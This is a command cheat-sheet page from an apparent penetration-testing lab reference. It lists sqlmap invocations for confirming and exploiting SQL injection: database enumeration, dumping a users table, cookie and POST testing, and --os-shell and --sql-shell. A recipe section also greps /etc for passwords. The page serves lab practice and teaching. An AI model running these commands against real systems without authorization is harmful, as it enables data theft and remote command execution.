---
title: "sqlmap"
sidebarTitle: "sqlmap"
description: "Test an identified SQL injection surface using a saved request."
keywords: ["sqlmap"]
boost: 10
hideFooterPagination: true
---

{/* Generated from Commands/sqlmap.md. Edit the Markdown source, then run scripts/sync_site.py. */}

Replace UPPER_CASE values with your lab values.

[Search this tool’s saved examples](/commands/notebook?tool=sqlmap) · [All tools](/index)

## Commands

**Kali**

```bash
sqlmap -r request.txt --batch
sqlmap -r request.txt --dbs
sqlmap -r request.txt -D DATABASE --tables
```

[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)

## Notebook recipes

2 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.

<AccordionGroup>

<Accordion title="Finding things">

### Finding things

**Kali Terminal, tmux, zsh, and Vim**

```bash
find / -name "*.conf" 2>/dev/null      # find by name, hide permission errors
find . -type f -mmin -10               # files modified in last 10 min
locate sqlmap                          # fast name search (run: sudo updatedb first)
which nmap                             # path of a command
whereis nmap
grep -ri "password" /etc 2>/dev/null   # recursive, case-insensitive search in files
```

</Accordion>

<Accordion title="sqlmap: Saved Requests and Enumeration">

### sqlmap: Saved Requests and Enumeration

**sqlmap: Saved Requests and Enumeration**

```bash
sqlmap -r request.txt --batch                 # from a saved raw request
sqlmap -u "http://$IP/item?id=1" --batch --dbs
sqlmap -u "http://$IP/item?id=1" -D shop --tables
sqlmap -u "http://$IP/item?id=1" -D shop -T users --dump
# Auth / cookies / POST
sqlmap -u "http://$IP/login" --data "user=a&pass=b" -p user
sqlmap -u "http://$IP/x" --cookie "PHPSESSID=..." --level 5 --risk 3
# Shells
sqlmap -r request.txt --os-shell            # OS command shell if possible
sqlmap -r request.txt --sql-shell
```

</Accordion>

</AccordionGroup>
